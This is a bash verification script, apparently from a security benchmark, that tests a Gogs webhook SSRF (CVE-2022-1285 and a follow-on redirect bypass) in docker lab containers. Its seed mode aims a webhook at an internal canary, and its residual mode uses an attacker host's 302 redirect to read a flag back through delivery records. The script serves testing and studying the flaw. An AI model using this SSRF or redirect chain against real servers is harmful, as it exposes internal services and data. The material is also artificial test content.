#!/usr/bin/env bash
# verify.sh --seed|--residual — PCBV2-0033 gogs-cve-2026-47267
# (CVE-2022-1285 -> CVE-2026-47267, webhook 投递 SSRF)
#
# 机制：Gogs webhook 的 payload URL 指向内部/攻击者地址，投递记录会保存响应 body。
#   --seed     -> webhook URL = http://canary:8000/flag
#                 v0(gogs0.12.7) API 建 hook 与投递均无本地地址校验（CVE-2022-1285），
#                 直投 canary -> delivery body 含 flag；v1(0.14.2) 投递时重新校验
#                 localCIDR（#6988 修复）-> canary 被拒，无响应记录
#   --residual -> webhook URL = http://attacker:8000/cb（LOCAL_NETWORK_ALLOWLIST
#                 白名单放行 attacker），attacker 对每次投递 302 重定向到
#                 http://canary:8000/flag；v1(0.14.2) 投递跟随重定向且不复查目标
#                 （CVE-2026-47267）-> 拿到 flag；v2(0.14.3) 拒绝跟随重定向
# 效果通道 = webhook 投递记录页（HTTP body，read_exfil）。
# 判定基准：RUN_FLAG_REF（回退 RUN_FLAG）。
# 退出码：0=效果发生 10=未发生 20=环境失败 30=参数错误
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }

CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
FLAG_REF="$RUN_FLAG"
mkdir -p "$WORK_DIR" 2>/dev/null || true

# gogs_util 位置：poc 目录 → case 根 → 树内 v2_harness（合并后 benchmark_v2 已并入 v2_harness）
GOGS_UTIL="${PCB_GOGS_UTIL:-}"
if [[ -z "$GOGS_UTIL" ]]; then
  for cand in \
    "$CASE_DIR/poc/gogs_util.py" \
    "$CASE_DIR/gogs_util.py" \
    "$CASE_DIR/../../v2_harness/inputs/PCBV2-0033/gogs_util.py"; do
    if [[ -f "$cand" ]]; then GOGS_UTIL="$cand"; break; fi
  done
fi
if [[ -z "$GOGS_UTIL" || ! -f "$GOGS_UTIL" ]]; then
  echo "verify: gogs_util.py not found (set PCB_GOGS_UTIL)" >&2
  exit 20
fi

# 宿主端口：compose 插值 ${PORT_3367x_0:-3367x}，优先 docker compose port 动态解析，
# 失败回退固定端口（与 gogs_util.PORTS 默认一致）
case "$VERSION" in
  v0) STATIC_PORT=33670 ;;
  v1) STATIC_PORT=33671 ;;
  v2) STATIC_PORT=33672 ;;
  esac
# 动态端口优先（compose 已转 PORT_ 动态端口）；失败回退硬编码
_SVC_ALL="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" config --services 2>/dev/null | grep -E "(^|-|_)$VERSION$")"
SVC="$(printf '%s\n' "$_SVC_ALL" | grep -vE "db|redis|mongo|mysql|postgres|sidecar|callback" | head -1)"
SVC="${SVC:-$(printf '%s\n' "$_SVC_ALL" | head -1)}"
_CP="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
_DYN="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$SVC" "${_CP:-8080}" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
[[ -n "$_DYN" ]] && PORT="$_DYN"
export PCB_TARGET_PORT="${PORT:-}"
PORT="$(CPORT="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
CPORT="${CPORT:-3000}"
docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$VERSION" "$CPORT" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
PORT="${PORT:-$STATIC_PORT}"

# seed 直连 canary / residual 走 attacker 302 重定向（语义见文件头）
HOOK_URL="http://canary:8000/flag"
[[ "$MODE" == "--residual" ]] && HOOK_URL="http://attacker:8000/cb"

# 容器 ID（allowlist 注入等待用）：compose 无显式 container_name，按 project+service 解析
CID="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" ps -q "$VERSION" 2>/dev/null | head -1)"

OUT="$("$PY" - "$GOGS_UTIL" "$VERSION" "$PORT" "$HOOK_URL" "$FLAG_REF" "$CID" <<'PYEOF'
import sys, importlib.util, traceback, time as _t, subprocess as _sp
util_path, version, port, hook_url, flag, cid = sys.argv[1:7]
spec = importlib.util.spec_from_file_location('gogs_util', util_path)
gu = importlib.util.module_from_spec(spec)
try:
    spec.loader.exec_module(gu)
except Exception as e:
    print("LOADERR", repr(e)); sys.exit(0)
gu.PORTS = {v: int(port) for v in ("v0", "v1", "v2")}
gu.BASE = {v: f"http://127.0.0.1:{int(port)}" for v in ("v0", "v1", "v2")}

try:
    if not gu.wait_ready(version, timeout=150):
        print("NOTREADY"); sys.exit(0)
    if not gu.install_gogs(version):
        # 幂等：gogs 可能已装好（同容器第二次 verify），POST /install 会失败但应用已就绪
        r2 = _sp.run(["docker", "exec", cid, "sh", "-c",
                      "test -f /data/gogs/conf/app.ini && echo yes || echo no"],
                     capture_output=True, text=True)
        if "yes" not in (r2.stdout or ""):
            print("INSTALLFAIL"); sys.exit(0)
    # v1/v2 的 compose entrypoint 会在 install 完成（app.ini 出现）后 sleep 10、
    # 追加 [security] LOCAL_NETWORK_ALLOWLIST=attacker 并 s6-svc -r 重启 gogs。
    # 若 test delivery 撞上这个窗口，第一次投递按旧配置被 localCIDR 拦截，
    # 要等 gogs 重启后 DeliverHooks 重投才成功——这里等 allowlist 落盘并等
    # 重启完成，消除竞态（v0 无此机制，直接继续）。
    if version != "v0" and cid:
        for _ in range(40):
            r = _sp.run(["docker", "exec", cid, "sh", "-c",
                         "grep -q 'LOCAL_NETWORK_ALLOWLIST' /data/gogs/conf/app.ini && echo yes || echo no"],
                        capture_output=True, text=True)
            if "yes" in (r.stdout or ""):
                _t.sleep(8)
                break
            _t.sleep(2)
        if not gu.wait_ready(version, timeout=40):
            print("NOTREADY"); sys.exit(0)
    token = gu.create_token(version)
    # create_repo 幂等：seed 已建过时 gogs 可能 422 或 500（webhook 失败后内部状态），都继续
    try:
        gu.create_repo(version, token)
    except Exception as _e:
        pass
    hook_id = gu.create_webhook_api(version, token, hook_url)
    if not gu.trigger_test_delivery(version, hook_id):
        print("TRIGGERFAIL"); sys.exit(0)
    body = gu.read_hook_delivery_body(version, hook_id, retries=20)
except Exception as e:
    print("EXC", repr(e), traceback.format_exc(limit=2).splitlines()[-1] if traceback.format_exc(limit=2) else ""); sys.exit(0)
print("MATCH" if flag in body else "NOMATCH", "|", "body_len=%d body_head=%r" % (len(body), body[:200]))
PYEOF
)" || { echo "$OUT" >&2; exit 20; }
echo "[probe] $OUT" | head -c 600; echo
case "$OUT" in
  MATCH*)   exit 0 ;;
  NOTREADY|INSTALLFAIL|TRIGGERFAIL|LOADERR|EXC*) echo "$OUT" >&2; exit 20 ;;
  *)        exit 10 ;;
esac
